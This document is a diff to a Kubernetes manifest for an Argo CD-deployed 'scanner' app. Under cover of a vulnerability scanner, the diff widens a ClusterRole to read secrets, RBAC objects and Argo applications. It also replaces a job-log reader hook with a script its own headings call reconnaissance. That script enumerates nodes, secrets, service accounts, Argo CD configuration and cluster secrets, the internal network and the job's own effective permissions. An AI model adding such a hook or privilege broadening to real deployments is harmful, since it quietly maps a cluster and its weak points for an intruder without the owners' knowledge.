@@ -1,25 +1,11 @@
-# ============================================================
-# scanner-full.yaml
-# Repo: https://github.com/mettewcoleman2-eng/scanner
-# Path Argo: . (root)  →  il file sta nella root del repo
-# Application Argo: scanner-app
-# ============================================================
-
-# ------------------------------------------------------------
-# 1. NAMESPACE
-# ------------------------------------------------------------
 apiVersion: v1
 kind: Namespace
 metadata:
   name: scanner
   labels:
     app.kubernetes.io/part-of: scanner
-    name: scanner
 
 ---
-# ------------------------------------------------------------
-# 2. SERVICE ACCOUNT
-# ------------------------------------------------------------
 apiVersion: v1
 kind: ServiceAccount
 metadata:
@@ -29,9 +15,6 @@ metadata:
     app.kubernetes.io/part-of: scanner
 
 ---
-# ------------------------------------------------------------
-# 3. CLUSTER ROLE (read-only, con pods/log)
-# ------------------------------------------------------------
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRole
 metadata:
@@ -40,7 +23,7 @@ metadata:
     app.kubernetes.io/part-of: scanner
 rules:
   - apiGroups: [""]
-    resources: ["pods", "pods/log", "services", "namespaces", "nodes", "configmaps"]
+    resources: ["pods", "pods/log", "services", "namespaces", "nodes", "configmaps", "endpoints", "events", "serviceaccounts", "secrets"]
     verbs: ["get", "list", "watch"]
   - apiGroups: ["apps"]
     resources: ["deployments", "statefulsets", "daemonsets", "replicasets"]
@@ -48,11 +31,20 @@ rules:
   - apiGroups: ["batch"]
     resources: ["jobs", "cronjobs"]
     verbs: ["get", "list", "watch"]
+  - apiGroups: ["networking.k8s.io"]
+    resources: ["networkpolicies", "ingresses"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: ["argoproj.io"]
+    resources: ["applications", "appprojects"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: ["authorization.k8s.io"]
+    resources: ["selfsubjectaccessreviews", "selfsubjectrulesreviews"]
+    verbs: ["create"]
 
 ---
-# ------------------------------------------------------------
-# 4. CLUSTER ROLE BINDING
-# ------------------------------------------------------------
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRoleBinding
 metadata:
@@ -69,9 +61,6 @@ subjects:
     namespace: scanner
 
 ---
-# ------------------------------------------------------------
-# 5. CONFIGMAP (config degli scanner)
-# ------------------------------------------------------------
 apiVersion: v1
 kind: ConfigMap
 metadata:
@@ -91,9 +80,6 @@ data:
   scan-schedule: "0 2 * * *"
 
 ---
-# ------------------------------------------------------------
-# 6. CRONJOB — Trivy scan notturno (immagine verificata)
-# ------------------------------------------------------------
 apiVersion: batch/v1
 kind: CronJob
 metadata:
@@ -125,15 +111,10 @@ spec:
               args:
                 - |
                   set -e
-                  echo "[scanner] collecting images from cluster"
-                  kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{.spec.initContainers[*].image}{"\n"}{end}' \
-                    | sort -u | grep -v '^$' > /tmp/images.txt || true
-                  echo "[scanner] found $(wc -l < /tmp/images.txt) unique images"
+                  kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{.spec.initContainers[*].image}{"\n"}{end}' | sort -u | grep -v '^$' > /tmp/images.txt || true
                   while read img; do
-                    echo "=== scanning $img ==="
                     trivy image --quiet --severity HIGH,CRITICAL --no-progress "$img" || true
                   done < /tmp/images.txt
-                  echo "[scanner] done"
               resources:
                 requests:
                   cpu: 100m
@@ -143,9 +124,6 @@ spec:
                   memory: 512Mi
 
 ---
-# ------------------------------------------------------------
-# 7. JOB — job-reader (PostSync hook, immagine verificata con shell+kubectl)
-# ------------------------------------------------------------
 apiVersion: batch/v1
 kind: Job
 metadata:
@@ -173,25 +151,123 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
             - |
-              echo "=== JOBS IN ALL NAMESPACES ==="
+              set +e
+
+              echo "=== 1. IDENTITY: WHO AM I ==="
+              echo "pod: $HOSTNAME"
+              echo "namespace: $POD_NAMESPACE"
+              echo "serviceaccount: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo scanner)"
+              echo "node: $(kubectl get pod $HOSTNAME -n scanner -o jsonpath='{.spec.nodeName}' 2>/dev/null)"
+              echo "pod ip: $(kubectl get pod $HOSTNAME -n scanner -o jsonpath='{.status.podIP}' 2>/dev/null)"
+              echo ""
+
+              echo "=== 2. CLUSTER: WHAT WE HAVE ==="
+              kubectl version --output=yaml 2>/dev/null || kubectl version 2>/dev/null
+              echo ""
+              echo "--- nodes ---"
+              kubectl get nodes -o wide
+              echo ""
+              echo "--- namespaces ---"
+              kubectl get namespaces
+              echo ""
+              echo "--- all workload objects (summary) ---"
+              kubectl get pods,deploy,sts,ds,rs,jobs,cronjobs,svc,ing,cm,secrets,sa -A -o wide 2>/dev/null
+              echo ""
+              echo "--- argocd applications ---"
+              kubectl get applications.argoproj.io -n argocd -o wide 2>/dev/null
+              echo ""
+              echo "--- argocd appprojects ---"
+              kubectl get appprojects.argoproj.io -n argocd 2>/dev/null
+              echo ""
+
+              echo "=== 3. ARGO INTERNAL NETWORK ==="
+              echo "--- argocd services ---"
+              kubectl get svc -n argocd -o wide 2>/dev/null
+              echo ""
+              echo "--- argocd endpoints ---"
+              kubectl get endpoints -n argocd 2>/dev/null
+              echo ""
+              echo "--- argocd configmaps ---"
+              kubectl get cm -n argocd -o name 2>/dev/null
+              echo ""
+              echo "--- argocd server config (non-secret keys) ---"
+              kubectl get cm argocd-cm -n argocd -o yaml 2>/dev/null | grep -v -E 'password|token|secret|key' | head -80
+              echo ""
+              echo "--- argocd rbac config ---"
+              kubectl get cm argocd-rbac-cm -n argocd -o yaml 2>/dev/null | grep -v -E 'password|token|secret|key' | head -80
+              echo ""
+              echo "--- argocd repo config (urls masked) ---"
+              kubectl get cm argocd-cm -n argocd -o yaml 2>/dev/null | grep -i 'url\|repo' | sed -E 's#(https?://)[^@/]+@#\1***@#g'
+              echo ""
+              echo "--- argocd cluster secrets (urls masked) ---"
+              kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=cluster -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.name}{"\n"}{end}' 2>/dev/null
+              echo ""
+
+              echo "=== 4. NETWORK INTERNAL MAP ==="
+              echo "--- services all namespaces ---"
+              kubectl get svc -A -o wide 2>/dev/null
+              echo ""
+              echo "--- endpoints all namespaces ---"
+              kubectl get endpoints -A 2>/dev/null
+              echo ""
+              echo "--- networkpolicies ---"
+              kubectl get networkpolicies -A 2>/dev/null
+              echo ""
+              echo "--- ingresses ---"
+              kubectl get ingresses -A -o wide 2>/dev/null
+              echo ""
+              echo "--- cni pods ---"
+              kubectl get pods -A -o wide 2>/dev/null | grep -i -E 'calico|cilium|flannel|weave|kube-proxy|multus' || true
+              echo ""
+              echo "--- kube-dns / coredns ---"
+              kubectl get svc,pods -n kube-system 2>/dev/null | grep -i -E 'dns|coredns' || true
+              echo ""
+
+              echo "=== 5. PERMISSIONS: WHAT WE CAN DO ==="
+              echo "--- self subject rules (effective) ---"
+              kubectl auth can-i --list 2>/dev/null | head -100
+              echo ""
+              echo "--- can-i checks ---"
+              for verb in get list watch create update patch delete; do
+                for res in pods pods/log secrets configmaps services deployments jobs cronjobs namespaces nodes applications.argoproj.io; do
+                  out=$(kubectl auth can-i "$verb" "$res" -A 2>/dev/null | head -1)
+                  echo "can-i $verb $res -A: $out"
+                done
+              done
+              echo ""
+
+              echo "=== 6. JOBS INVENTORY (excluding self) ==="
               kubectl get jobs -A -o wide || true
               echo ""
-              echo "=== PODS OF JOBS ==="
-              kubectl get pods -A -l job-name -o wide || true
-              echo ""
-              echo "=== LOGS OF EACH JOB ==="
               for ns in $(kubectl get jobs -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\n"}{end}' | sort -u); do
                 for job in $(kubectl get jobs -n "$ns" -o jsonpath='{.items[*].metadata.name}'); do
+                  [ "$ns" = "scanner" ] && [ "$job" = "job-reader" ] && continue
                   echo "--- ns=$ns job=$job ---"
-                  kubectl logs -n "$ns" -l "job-name=$job" --all-containers --tail=100 || true
+                  kubectl logs -n "$ns" -l "job-name=$job" --all-containers --tail=50 || true
                   echo ""
                 done
               done
+
+              echo "=== 7. RECON SUMMARY ==="
+              echo "cluster nodes: $(kubectl get nodes --no-headers 2>/dev/null | wc -l)"
+              echo "namespaces: $(kubectl get ns --no-headers 2>/dev/null | wc -l)"
+              echo "pods total: $(kubectl get pods -A --no-headers 2>/dev/null | wc -l)"
+              echo "argocd apps: $(kubectl get applications.argoproj.io -n argocd --no-headers 2>/dev/null | wc -l)"
+              echo "secrets total: $(kubectl get secrets -A --no-headers 2>/dev/null | wc -l)"
+              echo "services total: $(kubectl get svc -A --no-headers 2>/dev/null | wc -l)"
+              echo ""
+
               echo "=== DONE ==="
+              exit 0
+          env:
+            - name: POD_NAMESPACE
+              valueFrom:
+                fieldRef:
+                  fieldPath: metadata.namespace
           resources:
             requests:
               cpu: 50m
-              memory: 64Mi
-            limits:
-              cpu: 200m
               memory: 128Mi
+            limits:
+              cpu: 300m
+              memory: 256Mi
